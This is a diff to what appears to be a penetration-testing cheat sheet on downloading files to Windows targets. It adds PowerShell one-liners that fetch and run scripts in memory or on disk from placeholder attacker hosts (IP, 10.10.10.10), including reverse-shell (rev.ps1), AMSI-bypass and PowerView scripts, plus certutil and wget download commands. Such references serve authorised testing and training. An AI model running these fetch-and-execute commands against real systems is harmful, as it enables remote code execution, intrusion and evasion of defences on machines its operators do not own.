@@ -9,12 +9,26 @@ metaLinks:
 
 ### PowerShell
 
-```basic
+Download and execute (disk)
+
+```powershell
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://IP/script.ps1')"
+```
+
+Download and execute (memory) - short version
+
+```bash
+iex (iwr http://IP/amsi.ps1 -UseBasicParsing).Content
+```
+
+```bash
 # Download and Execute on Memory
 iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
 iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/PowerView.ps1');Get-NetComputer -Ping
 echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/rev.ps1') | powershell -noprofile -
+```
 
+```bash
 # Download
 Powershell -c Invoke-WebRequest "http: //10.10.10.10/rev.ps1" -OutFile C:\temp\rev.ps1
 PS > (new-object net.webclient).downloadfile('http://10.10.10.10/shell.bat', 'C:\users\Public\shell.bat')
@@ -26,7 +40,7 @@ cmd > powershell iwr http://10.10.10.10/file -OutFIle file1
 wget http://10.10.10.10/PowerView.ps1 -OutFile PowerView.ps1
 ```
 
-### Certutil
+### <sup>Certutil</sup>
 
 ```basic
 certutil -f -urlcache http://10.10.10.10/Powerview.ps1 C:\Users\Public\Powerview.ps1
